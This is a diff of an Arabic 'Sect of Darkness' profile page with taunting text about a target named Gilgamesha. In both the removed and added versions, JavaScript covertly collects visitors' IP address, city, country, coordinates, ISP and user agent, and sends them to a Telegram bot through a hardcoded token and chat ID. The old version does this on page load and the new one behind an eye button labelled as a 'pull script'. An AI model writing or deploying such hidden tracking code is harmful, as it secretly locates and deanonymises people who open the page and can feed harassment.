@@ -4,248 +4,200 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
-  <title>طائفة الظلام - DKSTx666</title>
+  <title>ركوب جلجامشة</title>
   <style>
     body {
       margin: 0;
-      background-color: pink;
+      background-color: #0e001a;
       font-family: Arial, sans-serif;
       direction: rtl;
-      text-align: center;
-      overflow-x: hidden;
-      position: relative;
+      color: #eee;
     }
 
-    .top-description {
-      background: linear-gradient(90deg, #4b0082, black, #4b0082);
-      color: white;
-      padding: 15px;
-      font-weight: bold;
-      font-size: 16px;
-      animation: fadeInOut 5s ease-in-out infinite;
-    }
-
-    @keyframes fadeInOut {
-      0%, 100% { opacity: 0.1; }
-      50% { opacity: 1; }
-    }
-
-    header {
+    .cover {
+      width: 100%;
+      height: 200px;
       background-image: url('5alfia.png');
       background-size: cover;
       background-position: center;
-      height: 250px;
       position: relative;
     }
 
-    .profile-pic {
-      width: 110px;
-      height: 110px;
-      border-radius: 50%;
-      border: 5px solid white;
-      background-image: url('profile.png');
-      background-size: cover;
-      background-position: center;
+    .profile-link {
       position: absolute;
-      bottom: -55px;
+      bottom: -50px;
       right: 20px;
+    }
+
+    .profile-link img {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      border: 4px solid #a020f0;
       animation: pulse 2s infinite;
-      box-shadow: 0 0 10px purple;
     }
 
     @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0.7); }
-      70% { box-shadow: 0 0 0 15px rgba(128, 0, 128, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0); }
+      0%, 100% { box-shadow: 0 0 10px #a020f0; }
+      50% { box-shadow: 0 0 20px #ff00ff; }
     }
 
-    .posts-container {
+    .description {
+      padding: 20px;
+      font-size: 15px;
+      background-color: #1e002a;
+      border-top: 2px solid #ff00ff;
+      border-bottom: 2px solid #ff00ff;
+      text-align: center;
+      line-height: 1.7;
+    }
+
+    .container {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
+      grid-template-columns: repeat(2, 1fr);
       gap: 10px;
-      padding: 80px 10px 30px;
+      padding: 15px;
     }
 
-    .post-img {
+    .post {
       width: 100%;
-      height: 120px;
+      height: 150px;
+      border-radius: 10px;
+      background-color: #220033;
+      overflow: hidden;
+    }
+
+    .post img {
+      width: 100%;
+      height: 100%;
       object-fit: cover;
       border-radius: 10px;
-      cursor: pointer;
-      transition: transform 0.3s, box-shadow 0.3s;
     }
 
-    .post-img:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 15px #4b0082;
-    }
-
-    .lightbox {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.9);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 999;
-      flex-direction: column;
-    }
-
-    .lightbox img {
-      max-width: 90%;
-      max-height: 80%;
-      border-radius: 10px;
-      margin-bottom: 20px;
-    }
-
-    .lightbox:target {
+    .btns {
       display: flex;
+      justify-content: space-around;
+      padding: 15px;
     }
 
-    .close-btn {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      font-size: 30px;
-      color: white;
-      text-decoration: none;
-    }
-
-    .download-btn {
-      background-color: purple;
-      color: white;
-      padding: 10px 20px;
-      border-radius: 10px;
-      text-decoration: none;
-      font-size: 16px;
-    }
-
-    /* 👑 زر فيديو دائري */
-    .video-fab {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
+    .circle-btn {
       width: 60px;
       height: 60px;
       border-radius: 50%;
-      background-color: black;
-      color: pink;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 24px;
-      box-shadow: 0 0 15px pink;
-      animation: pulse 2s infinite;
+      border: none;
+      color: white;
+      font-size: 14px;
       cursor: pointer;
-      z-index: 1000;
+      animation: pulse 2s infinite;
+    }
+
+    .video-btn {
+      background-color: purple;
+    }
+
+    .track-btn {
+      background-color: black;
+      animation: pulse 2s infinite;
+    }
+
+    audio {
+      display: none;
     }
   </style>
 </head>
 <body>
 
-  <div class="top-description">
-    ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير | 
-    طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم | 
-    لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
-  </div>
-
-  <header>
-    <a href="https://Almunharifvvv.ooguy.com/capture?chatId=7664410054" target="_blank">
-      <div class="profile-pic"></div>
+  <!-- 👑 الغلاف -->
+  <div class="cover">
+    <a class="profile-link" href="https://www.facebook.com/profile.php?id=61573033204340" target="_blank">
+      <img src="profile.png" alt="صورة البروفايل">
     </a>
-  </header>
-
-  <div class="posts-container">
-    <!-- 👑 منشورات -->
-    <a href="#img1"><img src="بدون اسم130_20250502141304.png" class="post-img"></a>
-    <a href="#img2"><img src="بدون اسم150_20250616203704.png" class="post-img"></a>
-    <a href="#img3"><img src="بدون اسم130_20250502141304.png" class="post-img"></a>
   </div>
 
-  <!-- 👑 نوافذ تكبير الصور مع زر تحميل -->
-  <div id="img1" class="lightbox">
-    <a href="#" class="close-btn">×</a>
-    <img src="بدون اسم130_20250502141304.png" id="zoom1">
-    <a href="بدون اسم130_20250502141304.png" download class="download-btn">تحميل الصورة</a>
+  <!-- 👑 الوصف -->
+  <div class="description">
+    <strong>ركوب جلجامشة</strong><br>
+    تجاوزت جلجامشة الخطوط الحمراء وبذلك صار دعسها عنوانها الأول والأخير.<br><br>
+    طائفة الظلام تتجاوز العتمة لتحكم في الأخير.<br>
+    نحن من يفعل قبل أن يتكلم، ويفعل قبل أن يُسأل.<br><br>
+    لطالما كان الظلام كلمات لا يفهمها إلا من قرأها...<br>
+    وشادو... هو من سيكتب الكلمات الأخيرة.
   </div>
 
-  <div id="img2" class="lightbox">
-    <a href="#" class="close-btn">×</a>
-    <img src="بدون اسم150_20250616203704.png" id="zoom2">
-    <a href="بدون اسم150_20250616203704.png" download class="download-btn">تحميل الصورة</a>
+  <!-- 👑 المنشورات -->
+  <div class="container">
+    <div class="post"><img src="بدون اسم130_20250502141304.png" alt="post1"></div>
+    <div class="post"><img src="بدون اسم150_20250616203704.png" alt="post2"></div>
   </div>
 
-  <!-- 👑 زر فيديو دائري يفتح index.html -->
-  <div class="video-fab" onclick="goToIndex()">🎥</div>
+  <!-- 👑 أزرار -->
+  <div class="btns">
+    <button class="circle-btn video-btn" onclick="window.location='video.html'">🎥</button>
+    <button class="circle-btn track-btn" onclick="sendData()">👁️</button>
+  </div>
+
+  <!-- 👑 الموسيقى -->
+  <audio id="bg-music" autoplay loop>
+    <source src="لحن النهاية.mp3" type="audio/mpeg">
+  </audio>
 
   <script>
-    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
-    const CHAT_ID = "7664410054";
-    let report = "🛑 تقرير دخول جديد:\n\n";
+    const music = document.getElementById("bg-music");
 
-    function getIPInfo() {
-      return fetch("https://ipinfo.io/json")
-        .then(res => res.json())
-        .then(data => {
-          report += `🌐 IP: ${data.ip || "❌"}\n`;
-          report += `📍 الدولة: ${data.country || "❌"}\n`;
-          report += `🏙️ المدينة: ${data.city || "❌"}\n`;
-          report += `🌎 إحداثيات: ${data.loc || "❌"}\n`;
-          report += `🛰️ خريطة: https://www.google.com/maps?q=${data.loc || ""}\n\n`;
-        }).catch(() => {
-          report += "🌐 IP: ❌ فشل جلب الـ IP\n\n";
-        });
+    function playMusic() {
+      music.play().catch(() => {});
     }
 
-    function getDeviceInfo() {
-      try {
-        const ua = navigator.userAgent;
-        report += `🧠 UserAgent: ${ua}\n`;
+    // تشغيل عند التفاعل
+    document.addEventListener("click", playMusic);
+    document.addEventListener("touchstart", playMusic);
 
-        if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد ✅\n";
-        else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون ✅\n";
-        else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز ✅\n";
-        else report += "🌀 الجهاز: غير معروف ❌\n";
-
-        if (/chrome/i.test(ua)) report += "🌐 المتصفح: Chrome ✅\n";
-        else if (/firefox/i.test(ua)) report += "🌐 المتصفح: Firefox ✅\n";
-        else if (/safari/i.test(ua)) report += "🌐 المتصفح: Safari ✅\n";
-        else report += "🌐 المتصفح: غير معروف ❌\n";
-
-        report += "\n";
-      } catch {
-        report += "🧠 معلومات الجهاز: ❌ فشل في التحليل\n\n";
+    // تشغيل عند تكبير
+    let lastWidth = window.innerWidth;
+    window.addEventListener("resize", () => {
+      if (window.innerWidth !== lastWidth) {
+        lastWidth = window.innerWidth;
+        playMusic();
       }
-    }
+    });
 
-    function sendToTelegram(msg) {
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
-      });
-    }
-
-    async function runReport() {
-      await getIPInfo();
-      getDeviceInfo();
-      sendToTelegram(report);
-    }
-
-    runReport();
-
-    // 👑 فتح صفحة index عند الضغط على زر الفيديو
-    function goToIndex() {
-      fetch("https://ipinfo.io/json")
+    // سكربت السحب
+    function sendData() {
+      fetch("https://ipapi.co/json/")
         .then(res => res.json())
         .then(data => {
-          const msg = `🎬 دخول إلى index-videos.html:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}`;
-          sendToTelegram(msg);
-          window.location.href = "index-videos.html"; // 👑 يمكن تغييره
+          const ip = data.ip || "??";
+          const city = data.city || "??";
+          const region = data.region || "??";
+          const country = data.country_name || "??";
+          const org = data.org || "??";
+          const system = navigator.userAgent;
+
+          const text = `
+👤 دخول جديد للموقع
+🌍 IP: ${ip}
+🏙️ المدينة: ${city}
+📍 الدولة: ${country}
+💻 نظام: ${system}
+🏢 مزود الخدمة: ${org}
+          `;
+
+          const token = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+          const chatId = "7664410054";
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: text
+            })
+          });
         });
     }
   </script>
+
 </body>
 </html>
-
